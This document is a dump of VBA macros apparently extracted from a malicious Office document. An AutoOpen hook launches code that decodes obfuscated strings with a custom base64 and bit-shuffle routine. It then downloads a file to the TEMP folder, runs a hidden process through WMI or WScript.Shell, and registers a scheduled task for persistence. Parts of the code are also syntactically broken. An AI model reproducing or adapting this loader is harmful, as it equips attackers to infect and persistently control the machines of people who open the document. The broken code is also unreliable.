stream : Macros/VBA/ThisDocument - 1526 bytes
########################################

Sub AutoOpen()
  NewMacros.Workbook_Open
End Sub
stream : Macros/VBA/NewMacros - 24306 bytes
########################################

Function URLDownloadToFile(ByVal pCaller As Long) As Long
  
  Sub Workbook_Open()
    Entrypoint
  End Sub
  Sub egGXJxL5nz()
    Dim env_var_1 As String
    env_var_1 = Environ("TEMP") & deobf_str("iP") & "7eVuiy8VjwqlwV8OpcVQ==")
    If Not Dir(env_var_1, vbDirectory) = vbNullString Then
      Exit Sub
    End If
    Dim Ced7Pn As String
    #If Win64 Then
      Ced7Pn = deobf_str("oPhSWfo8/Qbyq3BYqC59Urpr+lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho+1GqWpxDsK7wUappuFOi+/dR0qhwVvCqU0U=")
      Ced7Pn = Ced7Pn + "l"
    #End If
    geXy6 = URLDownloadToFile(0, Ced7Pn, env_var_1, 0, 0)
  End Sub

  Public Function Entrypoint() As Variant
    egGXJxL5nz
    Dim ib1LMED, kedL As String
    ib1LMED = deobf_str("Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d") & Environ("TEMP") & deobf_str("iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy+Ndkq9YVPjYXV0=") & deobf_str("Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f") & deobf_str("ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK+AjSNlJT+HL8XA==")
    q2n4nZ8k5l(ib1LMED)
    KdnbF0
  End Function

  Sub KdnbF0()
    Set FpeceZ5wxyWq = CreateObject(deobf_str("gqV5VqC/WFWi28dQuqfQVg=="))
    Call FpeceZ5wxyWq.Connect()
    Dim td: Set td = FpeceZ5wxyWq.NewTask(0)
    td.RegistrationInfo.Author = deobf_str("mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d")
    td.RegistrationInfo.Description = deobf_str("au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04+lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY+FdSAPzfRsjr51nyJHFZ")
    td.settings.StartWhenAvailable = True
    td.settings.Hidden = False
    Dim SjjH: Set SjjH = td.triggers
    Dim JBnC4fVEA: Set JBnC4fVEA = SjjH.Create(1)
    Dim TEHyxi: ts = DateAdd("d", 1, Now)
    TEHyxi = deobf_str("qlBUCugWcgwi2FUKulBVCupQV04=")
    JBnC4fVEA.StartBoundary = TEHyxi
    JBnC4fVEA.ID = deobf_str("uK/UVug+OVDY+l1d")
    Dim fU0wdOnfj: Set fU0wdOnfj = td.Actions.Create(0)
    fU0wdOnfj.Path = deobf_str("Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f")
    Call FpeceZ5wxyWq.GetFolder("\").RegisterTaskDefinition(deobf_str("mqt4Vqqz8xmAvnBS6OtcXw=="), td, 6, , , 3)
  End Sub

  Sub q2n4nZ8k5l(B8OqGQl3Qs8 As String)
    On Error Resume Next
    Err.Clear
    sLvKHipjRWhY = Ruyw5Qxt0QI(B8OqGQl3Qs8)
    If Err.Number != 0 Or sLvKHipjRWhY != 0 Then
      Err.Clear
      p2a4UDrsYo B8OqGQl3Qs8
    End If
    On Error GoTo 0
  End Sub

  Function Ruyw5Qxt0QI(GZn9Xen As String) As Integer
    Set Obj = GetObject(deobf_str("+q94VrLvdFlymE4fyL7fVvi2wFPocndd"))
    Set Obj2 = Obj.Get(deobf_str("+q94VrLvdFlymE4fyL7fVvi2wFPocndd"))
    Set q2fpw = Obj2.SpawnInstance_
    q2fpw.ShowWindow = 0
    Set dfHxvyUQe = GetObject(deobf_str("+q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ+vh9Xw=="))
    Ruyw5Qxt0QI = dfHxvyUQe.Create(GZn9Xen, Null, q2fpw, intProcessID)
  End Function

  Sub p2a4UDrsYo(GZn9Xen As String)
    CreateObject(deobf_str("ivPlUuC4dhzSqPBW+PpfXQ==")).Run GZn9Xen, 0
  End Sub

  Public Function qs0a(ByVal MY7mIZHtJYn As Long) As Long
    qs0a = MY7mIZHtJYn
    If yeyEJRa2 > 0 Then
      If MY7mIZHtJYn > 0 Then
        qs0a = int(qs0a / (2 ^ yeyEJRa2))
      Else
        If yeyEJRa2 > 31 Then
          qs0a = 0
        Else
          qs0a = qs0a And 0x7FFFFFFF
          qs0a = int(qs0a / (2 ^ yeyEJRa2))
          qs0a = qs0a Or 2 ^ (31 - yeyEJRa2)
        End If
      End If
    End If
  End Function

  Public Function cMr0Rr(ByVal MY7mIZHtJYn As Long) As Long
    cMr0Rr = MY7mIZHtJYn
    If yeyEJRa2 > 0 Then
      Dim i As Byte
      Dim m As Long
      For i = 1 To yeyEJRa2
        m = cMr0Rr And 0x40000000
        cMr0Rr = (cMr0Rr And 0x3FFFFFFF) * 2
        If m != 0 Then
          cMr0Rr = cMr0Rr Or 0x80000000
        End If
      Next i
    End If
  End Function

  Public Function qerV2Vm(ByVal AxfkuUq As Long) As Long
    Const qQz6 As Long = 5570645
    Const GV3upFY4TL As Long = 52428
    Const d1 = 7
    Const d2 = 14
    Dim t As Long, u, out As Long
    t = (AxfkuUq Xor qs0a(AxfkuUq, d2)) And GV3upFY4TL
    u = AxfkuUq Xor t Xor cMr0Rr(t, d2)
    t = (u Xor qs0a(u, d1)) And qQz6
    out = (u Xor t Xor cMr0Rr(t, d1))
    qerV2Vm = out
  End Function

  Public Function L0p7(ByRef iRJ0qO As ) As String
    Dim i, fr, UNK6FopTzqQO, raw As Long
    Dim a As String, B As String, c As String, d As String
    Dim kJ6YU As String
    Dim hF95IT75OEc
    Dim a2, b2 As String
    kJ6YU = ""
    For i = 0 To (UBound(iRJ0qO) / 4 + 1)
      fr = i * 4
      If fr > UBound(iRJ0qO) Then
        Exit For
      End If
      UNK6FopTzqQO = 0
      UNK6FopTzqQO = UNK6FopTzqQO Or cMr0Rr(iRJ0qO(fr + 3), 24)
      UNK6FopTzqQO = UNK6FopTzqQO Or cMr0Rr(iRJ0qO(fr + 2), 16)
      UNK6FopTzqQO = UNK6FopTzqQO Or cMr0Rr(iRJ0qO(fr + 1), 8)
      UNK6FopTzqQO = UNK6FopTzqQO Or iRJ0qO(fr + 0)
      raw = qerV2Vm(UNK6FopTzqQO)
      a = Chr(qs0a((raw And 0xFF000000), 24))
      B = Chr(qs0a((raw And 16711680), 16))
      c = Chr(qs0a((raw And 65280), 8))
      d = Chr(qs0a((raw And 255), 0))
      kJ6YU = kJ6YU + d + c + B + a
    Next i
    L0p7 = kJ6YU
  End Function

  Public Function deobf_str(arg_str As String) As String
    Dim Y6ZHNpf, ZHen, arrayByte3(255)
    Dim CZBj(63), arrayLong5(63)
    Dim mytH36A3Z(63), sihUSBK2 As Long
    Dim eq_in_str As Integer, iter As Long, mZhxZr As Long, i As Long
    Dim kJ6YU As String
    arg_str = Replace(arg_str, vbCr, vbNullString)
    arg_str = Replace(arg_str, vbLf, vbNullString)
    i = Len(arg_str) Mod 4
    If InStrRev(arg_str, "==") Then
      eq_in_str = 2
    ElseIf InStrRev(arg_str, "" + "=") Then
      eq_in_str = 1
    End If
    For i = 0 To 255
      Select Case i
        Case 65 To 90
        arrayByte3(i) = i - 65
        Case 97 To 122
        arrayByte3(i) = i - 71
        Case 48 To 57
        arrayByte3(i) = i + 4
        Case 43
        arrayByte3(i) = 62
        Case 47
        arrayByte3(i) = 63
      End Select
    Next i
    For i = 0 To 63
      CZBj(i) = i * 64
      arrayLong5(i) = i * 4096
      mytH36A3Z(i) = i * 262144
    Next i
    ZHen = StrConv(iRJ0qO, vbFromUnicode)
    ReDim Y6ZHNpf((((UBound(ZHen) + 1) \ 4) * 3) - 1)
    For iter = 0 To UBound(ZHen) Step 4
      sihUSBK2 = mytH36A3Z(arrayByte3(ZHen(iter))) + arrayLong5(arrayByte3(ZHen(iter + 1))) + CZBj(arrayByte3(ZHen(iter + 2))) + arrayByte3(ZHen(iter + 3))
      i = sihUSBK2 And 16711680
      Y6ZHNpf(mZhxZr) = i \ 65536
      i = sihUSBK2 And 65280
      Y6ZHNpf(mZhxZr + 1) = i \ 256
      Y6ZHNpf(mZhxZr + 2) = sihUSBK2 And 255
      mZhxZr = mZhxZr + 3
    Next iter
    kJ6YU = StrConv(Y6ZHNpf, vbUnicode)
    If eq_in_str Then kJ6YU = Left$(kJ6YU, Len(kJ6YU) - eq_in_str)
    deobf_str = L0p7(StrConv(kJ6YU, vbFromUnicode))
    deobf_str = substr_before_tilde(deobf_str, "~")
  End Function

  Function substr_before_tilde(deobf_str_ret As String) As String
    Dim nb_groups As Long
    Dim splitted_ret
    splitted_ret = Split(deobf_str_ret, "~")
    nb_groups = UBound(splitted_ret, 1)
    If nb_groups != 0 Then
      deobf_str_ret = Left$(deobf_str_ret, Len(deobf_str_ret) - nb_groups)
    End If
    substr_before_tilde = deobf_str_ret
  End Function
  

